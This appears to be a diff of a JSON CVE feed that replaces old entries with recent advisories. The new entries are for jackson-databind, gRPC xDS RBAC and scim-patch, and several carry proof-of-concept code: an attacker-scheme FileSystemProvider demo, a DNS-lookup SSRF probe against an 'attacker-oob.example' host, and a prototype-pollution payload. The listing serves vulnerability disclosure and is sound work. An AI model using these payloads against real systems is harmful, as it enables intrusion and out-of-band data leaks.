@@ -12,883 +12,863 @@
   },
   "cves": [
     {
-      "id": "CVE-2004-0677",
-      "summary": "Fastream NETFile FTP Server 6.7.2.1085 and earlier allows remote attackers to cause a denial of service (temporary hang) via the cd command with an unusual argument, possibly due to multiple leading slashes and/or an access to the floppy drive (\"A\").",
-      "cvssScore": 5,
+      "id": "CVE-2026-19032",
+      "summary": "### Summary\n\nA `java.nio.file.Path` field bound from untrusted JSON reaches `JDKFromStringDeserializer.NioPathHelper.deserialize`. The attacker string flows through `new URI(value)` → `Path.of(uri)`, then on `FileSystemNotFoundException` into a `ServiceLoader<FileSystemProvider>` enumeration that calls `provider.getPath(uri)` on the first scheme-matching provider. No scheme is rejected, so untrusted JSON can drive an arbitrary registered provider under the default `JsonMapper.builder().build()`.\n\nImpact is bounded. The JDK built-in providers (`file`, `jar`/zipfs) do no network I/O and do not mount, so the path is inert without a side-effecting third-party provider. Binding `Path` from untrusted input is already an anti-pattern.\n\n### Description\n\n`NioPathHelper.deserialize` performs provider resolution driven by the attacker URI (abridged; the real method also handles a Windows drive-letter prefix and wraps failures via `ctxt.handleInstantiationProblem(...)`):\n\n```java\nint colonIx = value.indexOf(':');\nif (colonIx < 0) { return Path.of(value); }\n...\nfinal URI uri = new URI(value);          // attacker-controlled URI string\ntry {\n    return Path.of(uri);                  // resolves scheme -> may load a FileSystemProvider\n} catch (FileSystemNotFoundException cause) {\n    final String scheme = uri.getScheme();\n    for (FileSystemProvider provider : ServiceLoader.load(FileSystemProvider.class)) {\n        if (provider.getScheme().equalsIgnoreCase(scheme)) {\n            return provider.getPath(uri);  // attacker scheme selects & drives a provider\n        }\n    }\n    // no matching provider -> ctxt.handleInstantiationProblem(...) (throws by default)\n}\n```\n\nThe attacker's scheme selects the provider and the attacker's URI is passed to it; the enumeration also forces provider classloading during `readValue`. For built-in schemes like `jar:`, `getPath` throws `FileSystemNotFoundException` (a mount requires explicit `newFileSystem`), surfacing as a wrapped `ValueInstantiationException` with no terminal effect. Any mount, network I/O, or resource access depends entirely on the selected provider.\n\n## Vulnerable Code Location\n\n- `src/main/java/tools/jackson/databind/deser/jdk/JDKFromStringDeserializer.java`\n  - `STD_PATH` → `NioPathHelper.deserialize`; `NioPathHelper.deserialize` body \n       (`new URI` → `Path.of(uri)` → `ServiceLoader.load(FileSystemProvider.class)` → `provider.getPath(uri)`).\n\n## Proof of Concept\n\nTwo PoCs are provided. \n\n> PoC 2 registers a custom `FileSystemProvider` to show that attacker JSON reaches `provider.getPath(attackerURI)` inside `readValue`. Whether a third-party provider then does anything harmful is outside the library's control. The in-scope issue is **PoC 1** — the `jar:`/arbitrary-scheme path reaching the `ServiceLoader` fallback with no scheme restriction.\n\n**PoC 1 — sink reached (built-in `jar` provider).** \n\n`com/poc/Vuln04_PathProvider.java`:\n```java\npackage com.poc;\n\nimport tools.jackson.databind.ObjectMapper;\nimport tools.jackson.databind.json.JsonMapper;\nimport java.nio.file.Path;\n\n/**\n * Vuln 4: java.nio.file.Path deserialization resolves an attacker URI via\n * Path.of(uri) / ServiceLoader<FileSystemProvider>.\n */\npublic class Vuln04_PathProvider {\n    public static class Config { public Path workdir; }\n\n    public static void main(String[] args) throws Exception {\n        ObjectMapper mapper = JsonMapper.builder().build();\n        // jar: scheme forces FileSystemProvider resolution / mounting attempt on attacker URI.\n        String json = \"{\\\"workdir\\\":\\\"jar:file:/tmp/jackson_poc_evil.zip!/x\\\"}\";\n        System.out.println(\"Deserializing (default mapper): \" + json);\n        try {\n            Config c = mapper.readValue(json, Config.class);\n            System.out.println(\"Resolved Path = \" + c.workdir + \"  (class=\" + (c.workdir==null?\"null\":c.workdir.getClass().getName()) + \")\");\n            System.out.println(\"RESULT: VULNERABLE - attacker URI scheme resolved through provider machinery during readValue\");\n        } catch (Throwable t) {\n            System.out.println(\"Throwable during resolution: \" + t.getClass().getName() + \": \" + t.getMessage());\n            System.out.println(\"RESULT: VULNERABLE (attacker URI drove provider resolution; threw \" + t.getClass().getSimpleName() + \" inside readValue)\");\n        }\n    }\n}\n```\n\n**PoC 2 — scheme-selection mechanism demo (custom `FileSystemProvider`).**\nA third-party provider (scheme `evilscheme`) registered via `META-INF/services/java.nio.file.spi.FileSystemProvider`, which is standing in for *any* provider a real application ships. \n\n`com/poc/EvilFileSystemProvider.java`:\n```java\npackage com.poc;\n\nimport java.nio.file.*;\nimport java.nio.file.spi.FileSystemProvider;\nimport java.nio.file.attribute.*;\nimport java.net.URI;\nimport java.io.IOException;\nimport java.util.*;\nimport java.util.Set;\nimport java.nio.channels.SeekableByteChannel;\n\n/**\n * A custom java.nio.file.spi.FileSystemProvider registered via META-INF/services, using the\n * scheme \"evilscheme\". It stands in for ANY third-party FileSystemProvider present on a real\n * application's classpath. Its static initializer and getPath() record that they executed,\n * proving that attacker-controlled JSON drove provider class loading + provider.getPath(uri)\n * inside jackson's readValue.\n */\npublic class EvilFileSystemProvider extends FileSystemProvider {\n    public static volatile boolean STATIC_INIT_RAN = false;\n    public static volatile String GET_PATH_URI = null;\n    static { STATIC_INIT_RAN = true; }\n\n    @Override public String getScheme() { return \"evilscheme\"; }\n\n    @Override public Path getPath(URI uri) {\n        GET_PATH_URI = uri.toString();\n        System.out.println(\">>> [EVIL-PROVIDER] getPath() invoked with attacker URI: \" + uri);\n        // A malicious/vulnerable provider could here open a socket, read a file, mount a FS, etc.\n        return java.nio.file.Path.of(System.getProperty(\"java.io.tmpdir\"), \"evilprovider-marker\");\n    }\n\n    // --- remaining abstract methods: minimal stubs ---\n    @Override public FileSystem newFileSystem(URI uri, Map<String,?> env) { throw new UnsupportedOperationException(); }\n    @Override public FileSystem getFileSystem(URI uri) { throw new FileSystemNotFoundException(); }\n    @Override public SeekableByteChannel newByteChannel(Path p, Set<? extends OpenOption> o, FileAttribute<?>... a) throws IOException { throw new UnsupportedOperationException(); }\n    @Override public DirectoryStream<Path> newDirectoryStream(Path d, DirectoryStream.Filter<? super Path> f) { throw new UnsupportedOperationException(); }\n    @Override public void createDirectory(Path d, FileAttribute<?>... a) { throw new UnsupportedOperationException(); }\n    @Override public void delete(Path p) { throw new UnsupportedOperationException(); }\n    @Override public void copy(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }\n    @Override public void move(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }\n    @Override public boolean isSameFile(Path p, Path p2) { return false; }\n    @Override public boolean isHidden(Path p) { return false; }\n    @Override public FileStore getFileStore(Path p) { throw new UnsupportedOperationException(); }\n    @Override public void checkAccess(Path p, AccessMode... m) { }\n    @Override public <V extends FileAttributeView> V getFileAttributeView(Path p, Class<V> t, LinkOption... o) { return null; }\n    @Override public <A extends BasicFileAttributes> A readAttributes(Path p, Class<A> t, LinkOption... o) { throw new UnsupportedOperationException(); }\n    @Override public Map<String,Object> readAttributes(Path p, String a, LinkOption... o) { throw new UnsupportedOperationException(); }\n    @Override public void setAttribute(Path p, String a, Object v, LinkOption... o) { }\n}\n```\n\nRegistration descriptor —\n`src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider`:\n```\ncom.poc.EvilFileSystemProvider\n```\n\nDriver — `com/poc/Vuln04b_PathProviderMount.java`:\n```java\npackage com.poc;\n\nimport tools.jackson.databind.ObjectMapper;\nimport tools.jackson.databind.json.JsonMapper;\n\n/**\n * Vuln 4 (end-to-end terminal effect): a third-party FileSystemProvider registered via\n * META-INF/services (scheme \"evilscheme\") stands in for any provider on a real app's\n * classpath. Attacker JSON with that scheme drives jackson's ServiceLoader fallback to\n * (1) load the provider class (running its static initializer) and (2) invoke\n * provider.getPath(attackerUri) -- all inside readValue, with NO application code.\n */\npublic class Vuln04b_PathProviderMount {\n    public static class Config { public java.nio.file.Path workdir; }\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"Provider static-init ran before deserialization? \" + EvilFileSystemProvider.STATIC_INIT_RAN);\n        ObjectMapper mapper = JsonMapper.builder().build();   // default config\n        String json = \"{\\\"workdir\\\":\\\"evilscheme://attacker-controlled/target?x=1\\\"}\";\n        System.out.println(\"Deserializing (default mapper): \" + json);\n\n        Config c = mapper.readValue(json, Config.class);\n\n        System.out.println(\"Resolved Path = \" + c.workdir);\n        System.out.println(\"Provider static-init ran: \" + EvilFileSystemProvider.STATIC_INIT_RAN);\n        System.out.println(\"Provider.getPath() attacker URI: \" + EvilFileSystemProvider.GET_PATH_URI);\n        boolean ok = EvilFileSystemProvider.GET_PATH_URI != null\n                && EvilFileSystemProvider.GET_PATH_URI.contains(\"attacker-controlled\");\n        System.out.println(ok\n            ? \"RESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)\"\n            : \"RESULT: NOT reproduced\");\n    }\n}\n```\n\n## Execution Steps\n\nThe PoCs need only the three Jackson 3.2.1 jars on the classpath and can be built with plain `javac`/`java` . PoC 2 additionally requires the `META-INF/services` descriptor to be on the **runtime** classpath\n\n```bash\n# 0. Locate the three published dependency jars.\nM2=\"$HOME/.m2/repository\"\nDB=\"$M2/tools/jackson/core/jackson-databind/3.2.1/jackson-databind-3.2.1.jar\"\nCORE=\"$M2/tools/jackson/core/jackson-core/3.2.1/jackson-core-3.2.1.jar\"\nANN=\"$M2/com/fasterxml/jackson/core/jackson-annotations/2.22/jackson-annotations-2.22.jar\"\nCP=\"$DB:$CORE:$ANN\"\n\n# 1. Compile the three sources.\ncd poc-project\nmkdir -p out\njavac -cp \"$CP\" -d out \\\n  src/main/java/com/poc/EvilFileSystemProvider.java \\\n  src/main/java/com/poc/Vuln04_PathProvider.java \\\n  src/main/java/com/poc/Vuln04b_PathProviderMount.java\n\n# 2. Put the ServiceLoader descriptor on the runtime classpath (needed by PoC 2).\nmkdir -p out/META-INF/services\ncp src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider \\\n   out/META-INF/services/java.nio.file.spi.FileSystemProvider\n\n# 3. Run both PoCs.\njava -cp \"out:$CP\" com.poc.Vuln04_PathProvider        # PoC 1\njava -cp \"out:$CP\" com.poc.Vuln04b_PathProviderMount  # PoC 2\n```\n\n## Reproduction Evidence\n\nExecuted against jackson-databind 3.2.1 (OpenJDK 25).\n\n**PoC 1 :**\n```\nDeserializing (default mapper): {\"workdir\":\"jar:file:/tmp/jackson_poc_evil.zip!/x\"}\nThrowable during resolution: tools.jackson.databind.exc.ValueInstantiationException: Cannot construct instance of `java.nio.file.Path`, problem: `java.nio.file.FileSystemNotFoundException`\n at [Source: REDACTED (`StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION` disabled); byte offset: #UNKNOWN] (through reference chain: com.poc.Vuln04_PathProvider$Config[\"workdir\"])\nRESULT: VULNERABLE (attacker URI drove provider resolution; threw ValueInstantiationException inside readValue)\n```\nNotes: the JDK **built-in** `jar` provider's `getPath` does not auto-mount (it also throws `FileSystemNotFoundException`, since only `newFileSystem` mounts). PoC 1 proves the in-scope defect: attacker input reaches the scheme-driven `ServiceLoader` resolution during `readValue` with no allow-list. PoC 2 only illustrates the downstream mechanism.\n\n**PoC 2  :**\n```\nProvider static-init ran before deserialization? true\nDeserializing (default mapper): {\"workdir\":\"evilscheme://attacker-controlled/target?x=1\"}\n>>> [EVIL-PROVIDER] getPath() invoked with attacker URI: evilscheme://attacker-controlled/target?x=1\nResolved Path = /var/folders/.../T/evilprovider-marker\nProvider static-init ran: true\nProvider.getPath() attacker URI: evilscheme://attacker-controlled/target?x=1\nRESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)\n```\nPurely from a JSON string, jackson's `ServiceLoader` fallback selected the attacker-named scheme's provider and invoked `provider.getPath(uri)` with the full attacker URI inside `readValue`. Whether a given provider then does anything harmful is outside the library's control; the in-scope issue is the absence of a scheme restriction before this fallback runs.\n\n## Impact\n\nUntrusted JSON drives `provider.getPath(attackerURI)` on an attacker-chosen provider during `readValue`. With only the JDK built-in providers this is inert. Real impact requires a side-effecting third-party provider on the classpath. The fix is to close the\nscheme-restriction gap.\n\n## Recommended Fix\n\n1. **Restrict the resolved scheme to a fixed, hard-coded set** ; reject `jar:` and other schemes via `ctxt.handleWeirdStringValue(...)`. A hard-coded set keeps the fix backport-safe with no new configuration surface.\n2. **Skip the `ServiceLoader<FileSystemProvider>` enumeration for disallowed schemes**, so untrusted JSON cannot select and drive an arbitrary registered provider.\n3. Document that `java.nio.file.Path`-typed fields should not be bound from untrusted JSON.",
+      "cvssScore": 5.3,
       "severity": "Medium",
-      "published": "2004-08-06",
+      "published": "2026-09-28",
+      "modified": "2026-09-28",
+      "cwe": {
+        "cwe_id": "CWE-470",
+        "name": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')"
+      },
+      "references": [
+        "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-wjgm-6hv5-3cvf",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-19032",
+        "https://github.com/FasterXML/jackson-databind/pull/6129",
+        "https://github.com/FasterXML/jackson-databind/commit/cc6756b61ed90b6b9227f670e0408d5d9bd48551",
+        "https://github.com/FasterXML/jackson-databind/commit/ce26eda3481cd796f76ba4c53ffe1da23b53f166"
+      ],
+      "vulnerableProducts": [
+        "tools.jackson.core:jackson-databind maven",
+        "com.fasterxml.jackson.core:jackson-databind maven"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-77310",
+      "summary": "### Summary\nCVE-2026-54514 (GHSA-hgj6-7826-r7m5) fixed an eager-DNS-resolution / SSRF issue in jackson-databind's deserialization of `java.net.InetSocketAddress` by switching to `InetSocketAddress.createUnresolved(...)` (PR #5951, commit 1f5a1037, released in 2.18.8 / 2.21.4 / 3.1.4). That fix did not cover the sibling `java.net.InetAddress` branch in the very same `FromStringDeserializer.Std._deserialize()` switch statement, which still calls `InetAddress.getByName(value)` and therefore performs an eager forward DNS lookup on attacker-controlled input at deserialization time. The fix is incomplete: the same vulnerability class remains reachable through `InetAddress`.\n\n### Details\nFile: src/main/java/com/fasterxml/jackson/databind/deser/std/FromStringDeserializer.java\n\nSibling cases in the same switch:\n- Line 357-358 (UNFIXED):\n    case STD_INET_ADDRESS:\n        return InetAddress.getByName(value);     // eager forward DNS lookup\n- Line 359-381 + helper at 494-496 (FIXED by PR #5951):\n    protected InetSocketAddress _inetSocketAddress(String host, int port) {\n        // 05-May-2026, tatu: [databind#5951] Prevent DNS lookup:\n        return InetSocketAddress.createUnresolved(host, port);   // no DNS\n    }\n\n`InetAddress` is a registered standard string-like scalar type (FromStringDeserializer.types() line 73; findDeserializer() maps it to STD_INET_ADDRESS at line 119-120). Any value deserialized into an `InetAddress`-typed target — a plain POJO field, a polymorphic subtype, or a default-typing-permitted slot — reaches `InetAddress.getByName(attackerControlledString)`, which invokes the OS/JVM resolver and performs forward DNS resolution before any application validation.\n\nThe parent fix's own added unit test asserts `address.isUnresolved()` with the comment \"should NOT resolve address\", confirming that performing DNS resolution during deserialization is precisely the behavior being treated as the vulnerability. The InetAddress branch still violates that property.\n\nVerified against the FIXED released artifact (jackson-databind 2.18.8, from Maven Central): decompiled bytecode shows the InetSocketAddress branch now routes through `_inetSocketAddress -> createUnresolved`, while `InetAddress.getByName` is still emitted unchanged in the InetAddress branch.\n\n### PoC\nLab-only, zero network egress. Run against the fixed jackson-databind 2.18.8.\n\nA custom JDK InetAddressResolver SPI (Java 18+) counts forward lookups locally and answers with loopback, so no traffic leaves the host:\n\n    ObjectMapper m = new ObjectMapper();\n    // InetSocketAddress (patched): 0 resolver lookups, isUnresolved=true\n    m.readValue(\"\\\"internal-metadata.attacker-oob.example:8080\\\"\", InetSocketAddress.class);\n    // InetAddress (unpatched sibling): 1 resolver lookup on the attacker host\n    m.readValue(\"\\\"internal-metadata.attacker-oob.example\\\"\", InetAddress.class);\n\nObserved output (jackson 2.18.8):\n    [A] InetSocketAddress  isUnresolved=true  resolverLookups=0  lastHost=null\n    [B] InetAddress        value=localhost/127.0.0.1  resolverLookups=1  lastHost=internal-metadata.attacker-oob.example\n\nA standalone variant (no SPI) using an RFC-6761 `.invalid` canary host shows the same: deserializing into InetAddress raises UnknownHostException (the OS resolver was invoked), while InetSocketAddress stays unresolved. Full source in PocResolverCount.java and PocInetAddressIncompleteFix.java.\n\nReachability with a plain field (no annotations, no polymorphism, no default typing):\n    static class Config { public InetAddress bindHost; public int port; }\n    mapper.readValue(\"{\\\"bindHost\\\":\\\"poc-reach.example\\\",\\\"port\\\":1}\", Config.class);\n    // -> resolver invoked on \"poc-reach.example\"\n\n### Impact\nAn attacker who can influence JSON deserialized into an `InetAddress` target can force the application to perform outbound forward DNS lookups for attacker-chosen hostnames at deserialization time, before any application-level validation. This yields a DNS-based SSRF / OOB primitive: out-of-band exfiltration / interaction via DNS callbacks, and blind probing of whether internal hostnames resolve (internal-host enumeration). This is the same impact class and trust boundary for which CVE-2026-54514 (CVSS 5.3, CWE-918) was assigned to the InetSocketAddress branch. It is a DNS-lookup / blind SSRF primitive, not arbitrary HTTP SSRF or RCE; it does not itself open a socket.\n\nSuggested fix: avoid eager resolution for InetAddress as well — e.g. defer resolution, validate the host string before resolving, or provide an opt-in/opt-out consistent with the InetSocketAddress fix (there is no direct unresolved-InetAddress equivalent, so deferring/validating or documenting the resolution is the practical mitigation).\n\nCredit : Ta Duc Thien",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-09-28",
+      "modified": "2026-09-28",
+      "cwe": {
+        "cwe_id": "CWE-918",
+        "name": "Server-Side Request Forgery (SSRF)"
+      },
+      "references": [
+        "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-vvgp-rfg2-7rr6",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-77310",
+        "https://github.com/FasterXML/jackson-databind/pull/6058",
+        "https://github.com/FasterXML/jackson-databind/commit/2fc7bd9057dd051d7dea0e5fcad89822d0fa5ebd",
+        "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.18.9"
+      ],
+      "vulnerableProducts": [
+        "com.fasterxml.jackson.core:jackson-databind maven",
+        "tools.jackson.core:jackson-databind maven"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-101914",
+      "summary": "### Impact\nWhen using RBAC to apply authentication rules, the exact path (method name) matcher applies a prefix match instead of an exact match for case-insensitive matches. As a result, if a service has a method with a name that is a prefix of the name of a different method, and they have different access rules, and case-insensitive matching is used, this bug can cause improper authentication.\n\n### Patches\n\nThis vulnerability is fixed in 1.13.1 and 1.14.1.\n\n### Workarounds\nThis problem can be avoided by enabling case-sensitive path matching.",
+      "cvssScore": 6.5,
+      "severity": "Medium",
+      "published": "2026-09-28",
+      "modified": "2026-09-28",
+      "cwe": {
+        "cwe_id": "CWE-187",
+        "name": "Partial String Comparison"
+      },
+      "references": [
+        "https://github.com/grpc/grpc-node/security/advisories/GHSA-88h9-xgvx-hvf2",
+        "https://github.com/grpc/grpc-node/commit/6cf64b596da03f1942a6b168998f0670217a99c4",
+        "https://github.com/grpc/grpc-node/commit/a6c5b31180cc8cea94d0a5ea215ce31a49e0409f",
+        "https://github.com/grpc/grpc-node/commit/f32f3712e44581d8dfc8359bd8d30096662f4c75",
+        "https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds%401.13.1"
+      ],
+      "vulnerableProducts": [
+        "@grpc/grpc-js-xds npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-61834",
+      "summary": "## Summary\n\nIncomplete Prototype Pollution Fix Allows Mutation of Inherited Built-in Method Objects\n\n`scim-patch` blocks direct dangerous path segments such as `__proto__`, `constructor`, and `prototype`, but still traverses inherited properties when applying SCIM patch paths.\n\nAn attacker who controls a SCIM PATCH operation can use paths such as `toString.polluted` to mutate shared built-in function objects, for example `Object.prototype.toString`.\n\n## Impact\n\nA malicious patch can add attacker-controlled properties to inherited built-in method objects. The impact is narrower than direct `Object.prototype` pollution, but the mutation is process-global and may affect application logic that reads properties from inherited methods.\n\n## Details\n\nAffected code paths:\n\n- `navigate()` reads inherited properties via `schema[subPath]`\n- `assign()` uses `key in obj`, which treats inherited properties as existing\n\nBecause inherited keys are followed, safe-looking path segments such as `toString` can resolve to shared built-in objects.\n\n## PoC\n\n```js\nconst assert = require(\"node:assert/strict\");\nconst { scimPatch } = require(\"./lib/src/scimPatch\");\n\nconst victim = {\n  schemas: [\"urn:ietf:params:scim:schemas:core:2.0:User\"],\n  userName: \"alice\",\n  active: true,\n  emails: [{ value: \"alice@example.com\", primary: true }],\n  meta: { created: \"x\", lastModified: \"x\", resourceType: \"User\" }\n};\n\ntry {\n  assert.equal(({}).toString.scimPatchPolluted, undefined);\n\n  scimPatch(victim, [\n    { op: \"add\", path: \"toString.scimPatchPolluted\", value: \"polluted\" }\n  ]);\n\n  assert.equal(({}).toString.scimPatchPolluted, \"polluted\");\n  console.log(({}).toString.scimPatchPolluted);\n} finally {\n  delete Object.prototype.toString.scimPatchPolluted;\n}\n```\n\nOutput:\n\n```text\npolluted\n```\n\nA no-path operation with a dotted value key is also affected:\n\n```js\nscimPatch(victim, [\n  { op: \"add\", value: { \"toString.noPathPolluted\": \"polluted\" } }\n]);\n```\n\n## Remediation\n\nDo not traverse inherited properties while resolving patch paths. Use own-property checks such as `Object.hasOwn(obj, key)` and create missing containers only for safe own keys.\n\nKeep the existing denylist for `__proto__`, `constructor`, and `prototype` as defense in depth.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2026-09-28",
+      "modified": "2026-09-28",
+      "cwe": {
+        "cwe_id": "CWE-915",
+        "name": "Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+      },
+      "references": [
+        "https://github.com/thomaspoignant/scim-patch/security/advisories/GHSA-2mhw-wcx5-v3xj",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-61834",
+        "https://github.com/thomaspoignant/scim-patch/pull/1127",
+        "https://github.com/thomaspoignant/scim-patch/commit/c86474f7a9b16191d939f59ba94eca6c6e63044b",
+        "https://github.com/thomaspoignant/scim-patch/releases/tag/v0.9.2"
+      ],
+      "vulnerableProducts": [
+        "scim-patch npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1041",
+      "summary": "Buffer overflow in mscreen on SCO OpenServer 5.0 and SCO UNIX 3.2v4 allows a local user to gain root access via (1) a long TERM environmental variable and (2) a long entry in the .mscreenrc file.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1998-08-27",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=108904874104880&w=2",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16615",
-        "http://marc.info/?l=bugtraq&m=108904874104880&w=2",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16615"
+        "ftp://ftp.sco.com/SSE/security_bulletins/SB-98.05a",
+        "http://marc.info/?l=bugtraq&m=90686250717719&w=2",
+        "http://www.cert.org/vendor_bulletins/VB-98.10.sco.mscreen",
+        "http://www.securityfocus.com/archive/1/10420",
+        "ftp://ftp.sco.com/SSE/security_bulletins/SB-98.05a"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0605",
-      "summary": "An incorrect configuration of the Order Form 1.0 shopping cart  CGI program could disclose private information.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-04-01",
-      "modified": null,
-      "cwe": "CWE-200",
-      "references": [
-        "http://marc.info/?l=bugtraq&m=92462991805485&w=2",
-        "http://marc.info/?l=bugtraq&m=92462991805485&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2175",
-      "summary": "phpSquidPass before 0.2 uses an incomplete regular expression to find a matching username in its database, which allows remote authenticated attackers to effectively delete other usernames via a short username that matches the end of the targeted username.",
-      "cvssScore": 4,
-      "severity": "Medium",
-      "published": "2002-12-31",
+      "id": "CVE-1999-0056",
+      "summary": "Buffer overflow in Sun's ping program can give root access to local users.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1998-09-09",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=102508071021631&w=2",
-        "http://sourceforge.net/forum/forum.php?forum_id=188359",
-        "http://www.iss.net/security_center/static/9417.php",
-        "http://www.securityfocus.com/bid/5090",
-        "http://marc.info/?l=bugtraq&m=102508071021631&w=2"
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/174",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/174"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2176",
-      "summary": "SQL injection vulnerability in Gender MOD 1.1.3 allows remote attackers to gain administrative access via the user_level parameter in the User Profile page.",
+      "id": "CVE-1999-1181",
+      "summary": "Vulnerability in On-Line Customer Registration software for IRIX 6.2 through 6.4 allows local users to gain root privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1998-09-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/19980901-01-PX",
+        "http://ciac.llnl.gov/ciac/bulletins/j-003.shtml",
+        "http://www.iss.net/security_center/static/7441.php",
+        "ftp://patches.sgi.com/support/free/security/advisories/19980901-01-PX",
+        "http://ciac.llnl.gov/ciac/bulletins/j-003.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0505",
+      "summary": "A Windows NT domain user or administrator account has a guessable password.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1998-10-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://www.cve.org/CVERecord?id=CVE-1999-0505",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0505"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0506",
+      "summary": "A Windows NT domain user or administrator account has a default, null, blank, or missing password.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1998-10-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://www.cve.org/CVERecord?id=CVE-1999-0506",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0506"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1351",
+      "summary": "Cross-site scripting vulnerability in Namazu 2.0.8 and earlier allows remote attackers to execute arbitrary Javascript as other web users via the index file name that is displayed when displaying hit numbers.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-12-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&w=2&r=1&s=namazu&q=b",
+        "http://www.osvdb.org/5690",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7875",
+        "http://marc.info/?l=bugtraq&w=2&r=1&s=namazu&q=b",
+        "http://www.osvdb.org/5690"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0623",
+      "summary": "Buffer overflow in AuthFilter ISAPI filter on Microsoft Commerce Server 2000 and 2002 allows remote attackers to execute arbitrary code via long authentication data, aka \"New Variant of the ISAPI Filter Buffer Overrun\".",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-07-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.iss.net/security_center/static/9426.php",
+        "http://www.osvdb.org/5163",
+        "http://www.securityfocus.com/bid/5112",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-033",
+        "http://www.iss.net/security_center/static/9426.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0631",
+      "summary": "Unknown vulnerability in nveventd in NetVisualyzer on SGI IRIX 6.5 through 6.5.16 allows local users to write arbitrary files and gain root privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2002-07-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/20020607-02-I",
+        "http://www.iss.net/security_center/static/9418.php",
+        "http://www.securityfocus.com/bid/5092",
+        "ftp://patches.sgi.com/support/free/security/advisories/20020607-02-I",
+        "http://www.iss.net/security_center/static/9418.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0639",
+      "summary": "Integer overflow in sshd in OpenSSH 2.9.9 through 3.3 allows remote attackers to execute arbitrary code during challenge response authentication (ChallengeResponseAuthentication) when OpenSSH is using SKEY or BSD_AUTH authentication.",
+      "cvssScore": 9.8,
+      "severity": "Critical",
+      "published": "2002-07-03",
+      "modified": null,
+      "cwe": "CWE-190",
+      "references": [
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-030.0.txt",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-06/0335.html",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000502",
+        "http://marc.info/?l=bugtraq&m=102514371522793&w=2",
+        "http://marc.info/?l=bugtraq&m=102514631524575&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0394",
+      "summary": "Red-M 1050 (Bluetooth Access Point) uses case insensitive passwords, which makes it easier for attackers to conduct a brute force guessing attack due to the smaller space of possible passwords.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2002-12-31",
+      "published": "2002-07-26",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://online.securityfocus.com/archive/1/284691",
-        "http://www.iss.net/security_center/static/9692.php",
-        "http://www.securityfocus.com/bid/5342",
